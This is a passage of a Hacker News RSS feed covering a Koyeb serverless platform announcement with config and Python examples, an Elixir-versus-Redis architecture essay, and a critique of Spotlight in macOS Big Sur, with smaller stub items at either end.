+1 (610) 442-1896</p><br>


							
													
					</div>
				</div></div>]]>
            </description>
            <link>https://virginhyperloop.com/press/first-passenger-testing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070618</guid>
            <pubDate>Thu, 12 Nov 2020 15:06:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced CLI for CouchDB Server]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25070521">thread link</a>) | @johnjackjames
<br/>
November 12, 2020 | https://pscouchdb.readthedocs.io/en/latest/ | <a href="https://web.archive.org/web/*/https://pscouchdb.readthedocs.io/en/latest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Note</p>
<p>If you are using CouchDB version 2, use the PSCouchDB 1.X version; if instead you are using CouchDB version 3 or 4, use the PSCouchDB version 2.X</p>
</div></div>]]>
            </description>
            <link>https://pscouchdb.readthedocs.io/en/latest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070521</guid>
            <pubDate>Thu, 12 Nov 2020 14:57:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Koyeb Serverless Engine: Docker Containers, Continuous Deployment of Functions]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25070416">thread link</a>) | @edouardb
<br/>
November 12, 2020 | http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions | <a href="https://web.archive.org/web/*/http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>In July, we announced the early access of the Koyeb platform to help developers and businesses run serverless data-processing apps in minutes. Since then, we have received a lot of feedback and have been at work improving the product.</p><p>Today, we are proud to announce the public availability of the <strong>Koyeb Serverless Engine</strong> with our latest features to <strong>deploy your own code</strong>. In addition to the ready-to-use integrations, you can now seamlessly deploy <strong><a href="#native-support-of-docker-containers">Docker Containers</a></strong> and <strong><a href="#continuous-deployment-of-python-and-nodejs-functions-using-git">Code Functions with built-in Continuous Deployment using Git</a>.</strong></p><p>This release brings the power of the Koyeb Serverless Engine to all developers and businesses with <strong><a href="#event-driven-processing">event-driven processing</a>, <a href="#serverless-autoscaling-and-high-availability">native autoscaling</a>,</strong> and <strong>a complete secret management engine.</strong> The Koyeb platform provides strong primitives for data-processing with our <strong><a href="#object-storage-api-and-data-processing">Universal S3-Compliant Object Storage API</a></strong> and <strong>ready-to-use integrations</strong>. We're also happy to share that <strong><a href="#new-open-source-catalog">our catalog is now open-source</a></strong>.</p><p>The Koyeb platform offers an efficient solution to deploy your serverless applications. It is the best platform to <strong>deploy short and long-running background processing tasks with no time limit for the execution of your jobs</strong>. Common use-cases are:</p><ul><li><em>Media processing</em>: transforming images, videos, audio recordings or PDFs directly at upload</li><li><em>Web scraping and headless browser requests</em>: fetching data from and interacting with websites which do not have any API</li><li><em>Interfacing with slow or asynchronous APIs</em>: calling slow APIs or APIs using callbacks</li><li><em>Asynchronous Computer Vision and Inference</em>: automatic content detection in photos and videos for indexing, metadata enrichment or advanced anlysis</li><li><em>Batch processing</em>: running heavy computations on batches of database records or media</li><li><em>Data science and report generation</em>: analysing data and generating pre-computed reports</li><li><em>Notification reception and processing from IoT devices</em>: reacting to events generated by devices and triggering actions</li><li><em>DevOps</em>: backup, monitoring, build and deployment jobs</li><li>And much more!</li></ul><p><strong>We're happy to provide 1000 hours of compute, 1TB of storage, and 5TB of bandwidth per month for free until the end of the year.</strong>  All the function executions are currently powered by <strong>1GB of RAM and 1 vCPU</strong>. <a target="_blank" rel="noopener" href="https://app.koyeb.com/auth/signup"><strong>Sign up now</strong></a> and start deploying serverless functions!</p><p>One of the recurring requests we got was the ability to <strong>deploy your own code on Koyeb</strong>. We get it: you need to be able to inject your business logic and pair it with our ready-to-use integrations to build your application faster and better.</p><p>When looking for an efficient way to let you manage your stack functions and modifications, we decided to go with the best-practice for code and infrastructure management: <strong>version everything</strong>. We're glad to share that this new release brings a <strong>native integration with git and GitHub</strong> to seamlessly integrate Koyeb with your development workflows.</p><p>Integrating Koyeb in your development environment is a two-step process:</p><ol start="1"><li>Add a <span><code><span>koyeb.yaml</span></code></span> file in your repository describing your stack configuration. Stacks can now be deployed with a simple YAML syntax which should look familiar.
For instance, to deploy a Python 3.8 function with the <span><code><span>handler</span></code></span> entrypoint in the <span><code><span>hello_world</span></code></span> package, your <span><code><span>koyeb.yaml</span></code></span> will look like:</li></ol><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: hello-world
<span>3</span>    runtime: python3.8
<span>4</span>    handler: hello_world.handler
</code></pre><p>Fork our <a target="_blank" rel="noopener" href="https://github.com/koyeb-community/hello-world-python">Hello World in Python on GitHub</a> to see a simple example in action. You can deploy Python and Node.js functions with the same syntax.</p><ol start="2"><li>Connect your GitHub repository to Koyeb.</li></ol><p>Now each time you <span><code><span>git push</span></code></span>, we will build and deploy your code!</p><p>For Python and Node.js functions, we take care of the complete build process using standard dependency management tools. If you want to read more about deploying code functions, check our <a target="_blank" rel="noopener" href="http://koyeb.com/docs/stacks/quickstart/deploy-python-function">Python function</a> and <a target="_blank" rel="noopener" href="http://koyeb.com/docs/stacks/quickstart/deploy-nodejs-function">Node.js function</a> documentation.</p><p>After looking into the serverless space, we found that serverless solutions were fragmented into two separate generations of products to solve the same problem: containers and code functions. Our research shows that a lot of developers and companies try to use code functions but end up migrating to a container service due to runtime limitations.</p><p>We want you to be able to process your data with the technology you know and love, so we decided to provide <strong>a unified solution to deploy your applications</strong>.</p><p><strong>Containers can be deployed with the same simple YAML syntax as functions.</strong>
For instance, to deploy the <span><code><span>koyeb/cowsay</span></code></span> container from the Docker Hub, you simply need three lines of configuration:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: hello-koyeb
<span>3</span>    image: koyeb/cowsay
</code></pre><p>The Koyeb Stacks work in a unified way for containers and code functions. The deployment of containers also integrates with git and lets you benefit from native versioning.</p><p>The Koyeb Serverless Engine is completely event-driven, allowing seamless integration with various sources and native autoscaling. The platform not only provides strong integration with events coming from our Object Storage gateway, it also lets you invoke your functions using events respecting the <a target="_blank" rel="noopener" href="https://cloudevents.io/">CloudEvent specification</a>.</p><p>The event system is designed to be powerful with <strong>easy filtering of incoming events using the Common Expression Language</strong>. Here is a simple example, triggering a container dumping the incoming event with <span><code><span>jq</span></code></span> each time an event is received on the Koyeb Object Storage gateway:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: display-koyeb-event
<span>3</span>    image: stedolan/jq
<span>4</span>    args: [".", "/koyeb/events/in/raw"]
<span>5</span>    events:
<span>6</span>      - cloudevent:
<span>7</span>          expression: event.source == "koyeb.com/gateway"
</code></pre><p>One of the most challenging parts of serverless technologies is troubleshooting. We decided to provide <strong>essential observability features and event tracing as part of the core platform</strong>. All stacks have an audit log with all the events received and which function they triggered. The event content is highly accessible, so you can easily understand your functions' executions and failures.</p><p>As events are the foundation of our connected world, we're exploring use-cases in the IoT space. If you want to talk about events or IoT, please <a target="_blank" rel="noopener" href="http://koyeb.com/contact">contact us</a>!</p><p><a target="_blank" rel="noopener" href="https://www.koyeb.com/docs/stacks/quickstart/bind-store-events">Read more about events in our documentation</a>.</p><p>As part of the Koyeb Platform, we provide an S3-Compliant Object Storage API to store your data. You can use a Koyeb Managed Store or connect your own account cloud service provider. We're happy to share that we already support major cloud service providers including <strong>GCP Storage and AWS S3</strong>.</p><p>We also have an impressive list of cloud service providers in preview: <strong>Azure Blob, Wasabi Storage, Backblaze B2, DigitalOcean Spaces, StackPath Object Storage, and Scaleway Object Storage</strong>.</p><p><strong>Our Serverless Compute Engine is designed to seamlessly integrate with our Object Storage API</strong>. You can easily interact with your Stores from your Koyeb Stack functions and access your data with no effort.</p><p>When you do so, each function execution will get <strong>short-lived credentials</strong> in the environment to access your data store and <strong>prevent credentials leakage</strong>.</p><p>Here is an example of a function using the stores with our secret management engine to fetch the content of an object. The object to fetch and bucket location are automatically provided in the incoming event:</p><pre><code><span>1</span><span>import boto3
</span><span>2</span>import os
<span>3</span>
<span>4</span>def handler(event, context):
<span>5</span>        obj_name = event["object"]["key"]
<span>6</span>        store_name = event["bucket"]["name"]
<span>7</span>        boto_session = boto3.Session(region_name=os.environ[f"KOYEB_STORE_{store_name}_REGION"])
<span>8</span>    store_client = boto_session.resource(
<span>9</span>        "s3",
<span>10</span>        aws_access_key_id=os.environ[f"KOYEB_STORE_{store_name}_ACCESS_KEY"],
<span>11</span>        aws_secret_access_key=os.environ[f"KOYEB_STORE_{store_name}_SECRET_KEY"],
<span>12</span>        endpoint_url=os.environ[f"KOYEB_STORE_{store_name}_ENDPOINT"],
<span>13</span>    )
<span>14</span>    obj = store_client.Object(obj_key).get()
<span>15</span>    content = obj["Body"].read()
<span>16</span>    # Add your own processing logic!
</code></pre><p>Our S3-Compliant object storage API can now also be used as a <strong>standalone solution to benefit from a unified API wherever your data is stored</strong>.</p><p>One of the core benefits of the Koyeb serverless engine is that <strong>autoscaling and high-availability are provided by design</strong>.</p><p>On the availability side, you don't need to worry about dealing with failures of the underlying infrastructure, we take care of <strong>automatically provisioning your functions on a new server in case of a failure</strong>.</p><p>On the scaling side, we <strong>automatically increase the number of containers according to the number of incoming events</strong>. Free accounts have a default scaling limit at 10 to prevent abuse, <a target="_blank" rel="noopener" href="https://app.koyeb.com/support">contact us</a> if you need to scale more!</p><p>Our function catalog has been completely refreshed with <strong>ready-to-use integrations which are now completely open-source</strong>: <a target="_blank" rel="noopener" href="http://github.com/koyeb-community">github.com/koyeb-community</a>.</p><p>It's easy to combine ready-to-use functions with your own code in Stacks. For instance, to to use the <a target="_blank" rel="noopener" href="http://koyeb.com/catalog/function/image-resize">image-resize function from the catalog</a>, simply add to your <span><code><span>koyeb.yaml</span></code></span>:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: image-resize
<span>3</span>    use: image-resize@1.0.0
<span>4</span>    with:
<span>5</span>      STORE: your-store
<span>6</span>      IMAGE_RESIZE_WIDTH: 150
</code></pre><p>All catalog functions can be easily forked, modified to your needs and deployed thanks to the GitHub integration.</p><p>This post extensively covers all of the platform's new features. If you want to read about complete examples, head to our new <a target="_blank" rel="noopener" href="http://koyeb.com/tutorials">tutorials section</a> where we cover complete end-to-end use-cases:</p><ul><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/image-search-app-with-koyeb-aws-rekognition-and-algolia">How to build an application with automatic labeling and indexation of medias using Koyeb, AWS Rekognition and Algolia</a></li><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/watermark-images-uploaded-to-your-backblaze-b2-bucket-automatically">How to automatically watermark images uploaded to a Backblaze B2 bucket</a></li><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/process-digitalocean-spaces-bucket-images-to-generate-thumbnail">How to process DigitalOcean Spaces images to generate thumbnails</a></li></ul><p>Some of you already spotted some of the new features under development in our documentation: cron to schedule recurring jobs, HTTP event sources, and our CLI are all under construction and scheduled for a release in the coming weeks!</p><p><strong>We're happy to provide 1000 hours of compute, 1TB of storage, and 5TB of bandwidth per month for free until the end of the year! <a target="_blank" rel="noopener" href="https://app.koyeb.com/auth/signup">Sign up now</a> ;)</strong></p><p>As always, we're available through our <a target="_blank" rel="noopener" href="https://app.koyeb.com/support"><strong>support channel</strong></a>, <a target="_blank" rel="noopener" href="https://slack.koyeb.com/"><strong>Slack</strong></a> or through our integrated instant messaging system if you have a question or want to share feedback.</p><p>We'…</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions">http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions</a></em></p>]]>
            </description>
            <link>http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070416</guid>
            <pubDate>Thu, 12 Nov 2020 14:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You may not need Redis with Elixir]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070203">thread link</a>) | @rkangel
<br/>
November 12, 2020 | https://dashbit.co/blog/you-may-not-need-redis-with-elixir | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/you-may-not-need-redis-with-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> November 11th, 2020
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/redis">redis</a>, <a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/pubsub">pubsub</a>, <a href="https://dashbit.co/blog/tags/processes">processes</a>
  </li>
</ul>
<p>
If you have participated in a discussion about Elixir, you may have heard “you may not need Redis with Elixir”. Given that Redis has many use cases, this sentence may confuse developers as they try to match Elixir’s different features against Redis’ capabilities. This article aims to explore different scenarios where the above is true, when they are not, and which trade-offs you may want to consider. We will discuss four cases:</p>
<ol>
  <li>
<a href="#post-pubsub">Distributed PubSub</a>  </li>
  <li>
<a href="#post-presence">Presence</a>  </li>
  <li>
<a href="#post-caching">Caching</a>  </li>
  <li>
<a href="#post-async">Asynchronous processing</a>  </li>
</ol>
<p>
Before we start, I want to emphasize we find Redis a fantastic piece of technology. This is not a critique of Redis but rather a discussion of the different options Elixir developers may have available.</p>
<h2 id="post-pubsub">
  Case #1: Distributed PubSub</h2>
<p>
The first scenario where you may not need Redis with Elixir is Distributed <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">PubSub</a>. Throughout this section, we will consider PubSub systems to provide <strong>at-most-once delivery</strong>: they broadcast events to the currently available subscribers. If a subscriber is not around, they won’t receive the message later.</p>
<p>
For this reason, PubSub systems are often paired with databases to offer persistence. For example, every time someone sends a message in a chat application, the system can save the contents to the database and then broadcast it to all users. This means everyone connected at a given moment sees the update immediately, but disconnected users can catch up later.</p>
<p>
Imagine that you have multiple nodes, and you want to exchange messages between said nodes. In Elixir, thanks to the Erlang VM, which ships with distribution support, this can be as simple as:</p>
<pre><code><span>for</span><span> </span><span>node</span><span> </span><span>&lt;-</span><span> </span><span>Node</span><span>.</span><span>list</span><span data-group-id="8737372369-1">(</span><span data-group-id="8737372369-1">)</span><span> </span><span data-group-id="8737372369-2">do</span><span>
  </span><span>send</span><span data-group-id="8737372369-3">(</span><span data-group-id="8737372369-4">{</span><span>:known_name</span><span>,</span><span> </span><span>node</span><span data-group-id="8737372369-4">}</span><span>,</span><span> </span><span>:hello_world</span><span data-group-id="8737372369-3">)</span><span>
</span><span data-group-id="8737372369-2">end</span></code></pre>
<p>
In <a href="https://github.com/phoenixframework/phoenix_pubsub/blob/master/lib/phoenix/pubsub.ex">200LOC or less</a>, you can implement a PubSub system that broadcasts to all subscribers within the same node or anywhere else in a cluster, without bringing any third-party tools. At best, you will need <a href="https://github.com/bitwalker/libcluster">libcluster</a> - an Elixir library - to establish the connection between the nodes based on some strategy (K8s, AWS, DNS, etc.).</p>
<p>
In other words, PubSub pretty much ships out of the box with Elixir. Technologies without distribution would need to rely on Redis PubSub, PostgreSQL Notifications, or similar to achieve the same.</p>
<p>
Of course, the above assumes your infrastructure allows you to directly establish connections between nodes, which may not be possible in some PaaS, such as Heroku. In those cases, you can use any of the technologies above (Phoenix <a href="https://dashbit.co/blog/github.com/phoenixframework/phoenix_pubsub_redis/">has a Redis adapter</a> for its PubSub), or alternatively use platforms, such as <a href="https://www.gigalixir.com/">Gigalixir</a>, that make it trivial to setup a cluster.</p>
<h2 id="post-presence">
  Case #2: Presence</h2>
<p>
Presence is the ability to track who is connected in a cluster right now — the “who” may be users, phones, IoT devices, etc. For example, if Alice is connected to node A, she wants to see that Bob is also available, even if he has joined node B.</p>
<p>
Presence is one of the problems that are more complicated to implement than it sounds. For example, let’s consider implementing Presence by storing the connected entities in a database. However, what happens if a node crashes or leaves the cluster? Because the node crashed, all the users connected to it must be removed, but the node itself cannot do so. Therefore the other nodes need to detect those failure scenarios and act accordingly. But observing failures in a distributed system is also complicated: how do you differentiate between a temporarily unresponsive node from one that permanently failed?</p>
<p>
Another common approach to solve this problem is to frequently write to a database while users are connected. If you have seen no writes within a timeframe, you consider those users to be disconnected. However, such solutions have to choose between being write-intensive or inaccurate. For instance, let’s say that users become disconnected after 1 minute. This means that you need to write to the database every 1 minute for every user. If you have 10k users, that’s 167 writes per second, only to track that the users are connected. Meanwhile, the gap between a user leaving and having their status reflected in the UI is, in the worst-case scenario, also 1 minute. Any attempt at reducing the number of writes implies an increased gap.</p>
<p>
Given Elixir’s clustering support, we can once more implement <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> without a need for third-party dependencies! We use a PubSub system to implement Presence, as we need to notify as users join and leave. Instead of relying on centralized storage, the nodes directly communicate and exchange information about who is around. This removes the need for frequent writes. When a user leaves, this is also reflected immediately.</p>
<p>
So while you can use Redis or another storage to provide Presence, Elixir can deliver a solution that is efficient and doesn’t require third-party tools.</p>
<h2 id="post-caching">
  Case #3: Caching</h2>
<p>
The solutions to previous cases were built on top of Erlang’s unique distribution capabilities. In the following sections, the distinguishing factor between needing Redis or not will be <strong>multi-core concurrency</strong>, so this discussion is more generally applicable. Therefore, when we say Elixir in this section, it will also apply to JVM, Go, and other environments. They will contrast to Ruby, Python, and Node.js, in which their primary runtimes do not provide adequate multi-core concurrency within a single Operating System process.</p>
<p>
Let’s start with the non-concurrent scenario. Consider you are building a web application in Ruby, Python, etc. To deploy it, you get two eight-core machines. In languages that do not provide satisfactory multi-core concurrency, a common option for deployment is to start 8 instances of your web application, one per core, on each node. Overall, you will have CxN instances, where C is the number of cores, and N is the number of nodes.</p>
<p>
Now consider a particular operation in this application that is expensive, and you want to cache its results. The easiest solution, regardless of your programming environment, is to cache it in memory. However, given we have 16 instances of this application, caching it in memory is suboptimal: we will have to perform this expensive operation at least 16 times, one for each instance. For this reason, it is widespread to use Redis, Memcached, or similar for caching in environments like Ruby, Python, etc. With Redis, you would cache it only once, and it will be shared across all instances. The trade-off is that we are replacing memory access by a network round-trip, and the latter is orders of magnitude more expensive.</p>
<p>
Now let’s consider environments with multi-core concurrency. In languages like Elixir, you start one instance per node, regardless of the number of cores, since the runtime will share memory and efficiently spread the work across all cores. When it comes to caching, keeping the cache in-memory is a much more affordable scenario, as you will only have to compute once per node. Therefore, you have the <em>option</em> to skip Redis or Memcached altogether and avoid network round-trip.</p>
<p>
Of course, this depends on how many nodes you are effectively running in production. Luckily, many companies report being able to <a href="https://dev.to/erlangsolutions/why-elixir-is-the-programming-language-you-should-learn-in-2020-5g00">run Elixir with an order of magnitude less nodes</a> than technologies they have migrated from.</p>
<p>
You can also choose a mixed approach and store the cache both in-memory and in Redis. First, you look up in memory and, if missing, you fallback to Redis. If unavailable in both, then you execute the operation and cache it in each. The critical part to highlight here is that multi-core environments give you more flexibility to tackle these problems while reducing resource utilization. In Elixir/Erlang, you can also keep the cache in memory and use PubSub to distribute it across nodes. You can see this last approach in action <a href="https://github.com/tompave/fun_with_flags">in the excellent FunWithFlags library</a>.</p>
<p>
Another trade-off to consider is that all in-memory cache will be gone once you deploy new nodes. Therefore, if you need data to persist across deployments, you will want to use Redis as a cache layer, as detailed above, or dump the cache in a storage, such as database, S3, or Redis, before each deployment.</p>
<h2 id="post-async">
  Case #4: Asynchronous processing</h2>
<p>
Another scenario you may not need Redis in Elixir is to perform asynchronous processing. Let’s continue the discussion from the previous case.</p>
<p>
In environments without or with limited multi-core concurrency, given each instance is assigned to one core, they are limited in their ability to handle requests concurrently. This has led to a common saying that “you should avoid blocking the main thread”. For example, imagine that your application has to deliver emails on sign up or generate some computationally expensive reports. While one of your 16 web instances is doing this, it cannot handle other incoming requests efficiently. For this reason, a common choice here is to move the work elsewhere, typically a background-job processing queue. First, you store the work to be done on Redis or similar. Then one of the 16 web instances (or more commonly a completely different set of workers) grabs it from the queue.</p>
<p>
In multi-core concurrent environments, requests can be handled concurrently regardless if they are doing CPU or IO work. Sending the email from the request itself won’t block other requests. Generating the report is not a problem, as requests can be served by other CPUs. These platforms typically get assigned as many requests as they can handle and they distribute the work over the machine resources. Even if you prefer to deliver emails outside of the request, in order to send an earlier response to users, you can spawn an asynchronous worker without a need to move the delivery to an external queue or to another machine. Once again, concurrency gives us a more straightforward option to tackle these scenarios.</p>
<p>
Note the Erlang VM takes care of multiplexing CPU and IO work without a need for developers to tag functions as async or similar. Workers in Erlang/Elixir are …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/you-may-not-need-redis-with-elixir">https://dashbit.co/blog/you-may-not-need-redis-with-elixir</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/you-may-not-need-redis-with-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070203</guid>
            <pubDate>Thu, 12 Nov 2020 14:27:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spotlight Changes in macOS 11 Big Sur]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069943">thread link</a>) | @brandonhorst
<br/>
November 12, 2020 | https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur | <a href="https://web.archive.org/web/*/https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>macOS 11 Big Sur changed Spotlight to bring it more in line with iPadOS search. These changes are intended to simplify things, but they create inconsistencies that may be confusing both to newcomers and to long-time users.</p>

<p>Ultimately, there are three interconnected changes: <a href="#spotlight-11-hidden-previews">hidden previews</a>, <a href="#spotlight-11-disclosure-indicators">disclosure indicators</a>, and <a href="#spotlight-11-suggestions">suggestions</a>. This post will analyze the changes and provide <a href="#spotlight-11-recommendations">recommendations</a> to help frustrated users.</p>

<p>Of course, I believe that <a href="https://lacona.app/">Lacona</a> is an alternative to Spotlight that is both more usable and more powerful, but I won’t be making comparisons to Lacona in this analysis.</p>



<p>Just as before, you call up Spotlight by pressing <code>⌘+Space</code>, or by clicking the magnifying glass icon in the menu bar. However, things change once you start typing.</p>

<p>In macOS X, Spotlight showed your <em>search results</em> in a list on the left side, with a <em>preview</em> on the right side. In Big Sur, the search results are presented in a single list, with no visible preview.</p>

<p><img src="https://lacona.app/img/posts/spotlight-1.png" alt="Spotlight &quot;app&quot; screenshot"></p>

<p>These previews—which were originally introduced as a headlining feature of macOS 10.10 Yosemite—are not actually gone, just hidden. Clicking on a result, or pressing <code>Tab</code> will show the preview.</p>

<p>It’s clear that hiding the preview is an attempt to make the interface appear simpler and more iOS-like. Indeed, it frees up space; but the new space isn’t actually used for anything. For most queries, this space is left completely empty. What’s worse, this whitespace visually separates the results from the crucial new interface element on the far right side, the <em>disclosure indicator</em>.</p>

<h2 id="spotlight-11-disclosure-indicators">Disclosure Indicators</h2>

<p>Some results have a small iOS-style arrow on the far right side. Apple refers to this arrow as a disclosure indicator. It indicates that pressing <code>Return</code> on this result will not open anything, but will instead display the preview on the right side of the window.</p>

<p>Once the preview is displayed, pressing <code>Return</code> again will open the result, even though the disclosure indicator is still present.</p>

<p><img src="https://lacona.app/img/posts/spotlight-2.png" alt="Spotlight &quot;apple stock&quot; screenshot"></p>

<p>These results can be very useful! However, for the first time in Spotlight’s history, ambiguity is introduced to the <code>Return</code> key. Some may consider this necessary complexity, but it’s not the last inconsistency we’ll see today.</p>

<h2 id="spotlight-11-suggestions">Suggestions</h2>

<p>In addition to showing search results, Spotlight now has an additional unlabeled section which I call <em>suggestions</em>. Directly below the unlabeled “top results” section for any given search, there is a section containing a handful of queries that Spotlight believes you may be typing. Some of these queries show the icon of your default web browser, and others show a Spotlight icon and have a disclosure indicator. The number and order of these results varies, but they could take up as much as 83% of the results “above the fold”.</p>

<p><img src="https://lacona.app/img/posts/spotlight-3.png" alt="Spotlight &quot;apple&quot; screenshot"></p>

<p>These suggestions are based on both “Siri Suggestions” and the files of your Mac. This behavior is interesting, but I can’t say it’s very useful; the files referenced always show up further down on the list.</p>

<p>When selecting one of the results with the web browser icon, Spotlight will search for the query using your default web search engine in your default browser.</p>

<p>When selecting one of the results with the Spotlight icon, your input query will change to the suggestion, and the preview will also be shown.</p>

<h4 id="the-problem-with-suggestions">The Problem with Suggestions</h4>

<p>The most important inconsistencies with these suggestions come when using the mouse. Since the inception of OSX, clicking has meant <em>select</em>. Single-click a file in Finder or a track in Music, and it will be selected. This is how Spotlight used to work, and all non-suggestion results in Spotlight still work this way.</p>

<p>However, for suggestion results, clicking will <em>activate them immediately</em>. This, you may notice, is the way things work on iPadOS. Not only is this inconsistent with macOS in general, it is inconsistent with other results <em>on the very same list</em>. Worse still, because the suggestions section is unlabeled, it becomes harder to figure out exactly what clicking on a result will do.</p>

<p>Even with the keyboard, these suggestions behave completely differently from all other results. I originally tried to write out all different cases, but the inconsistencies are too numerous to list with text. I’ve attached an <a href="#spotlight-11-appendix">appendix</a> enumerating all the cases.</p>

<p>Overall, the suggestions section is Spotlight’s biggest step backward in usability. Its behavior is inconsistent and confusing, it takes up huge portions of the most important result space, and its utility is situational at best. Worst of all, this is the only section which cannot be fully disabled in the Spotlight preferences. <em>You’re stuck with it.</em></p>

<h2 id="spotlight-11-recommendations">Recommendations</h2>

<p>To make your search experience better, here are some recommendations:</p>

<ul>
  <li>Expand the window by dragging from the bottom, so that more results can be displayed.</li>
  <li>Ignore the “suggestions” section and its inconsistent behavior.</li>
  <li>Consider disabling “Siri Suggestions” in the Spotlight preferences, which removes many (but not all) of the suggestions.</li>
  <li>Don’t rely on the mouse for selecting items. Use the <code>⌘+Down</code> and <code>⌘+Up</code> shortcuts to quickly move the selection between entire sections with the keyboard.</li>
  <li>Press <code>Tab</code> whenever you want to see a Preview of the results.</li>
  <li>Consider using a Spotlight alternative with a more considered design.</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>Spotlight in macOS 11 Big Sur is torn between two between different worlds.</p>

<p>In one dimension, it introduced iOS ideas like disclosure indicators and single-tap actions for its new features. However, it only went half way, leading to an inconsistent and unpredictable experience.</p>

<p>In another dimension, it is trying to introduce AI-powered suggestions to make Spotlight more proactive and Siri-like. However, these suggestions are too constrained by the existing Spotlight interface to be very useful, and take up valuable space that could be used for the more reliable features.</p>

<p>In future releases, I hope that Apple can push Spotlight fully into simplified iOS paradigm, or retreat to the power of macOS. In macOS 11 Big Sur, it tries to straddle the line and fails at both.</p>

<h2 id="spotlight-11-appendix">Appendix: Behavior Changes</h2>

<h4 id="spotlight-behavior-in-macos-1015-catalina-and-prior">Spotlight Behavior in macOS 10.15 Catalina (and Prior)</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Click</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>

<h4 id="spotlight-behavior-in-macos-11-big-sur">Spotlight Behavior in macOS 11 Big Sur</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Tab</th>
      <th>Click (Selected)</th>
      <th>Click (Unselected)</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Web Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show preview</td>
    </tr>
    <tr>
      <td>Result with disclosure indicator</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Previewed result with disclosure indicator</td>
      <td>Open</td>
      <td>None</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Spotlight Completion</td>
      <td>Modify input</td>
      <td>Select input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Browser Completion</td>
      <td>Open</td>
      <td>Select input</td>
      <td>Open</td>
      <td>Open</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>
</div></div>]]>
            </description>
            <link>https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069943</guid>
            <pubDate>Thu, 12 Nov 2020 14:06:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Cold Email for Interesting People]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25069895">thread link</a>) | @philipkiely
<br/>
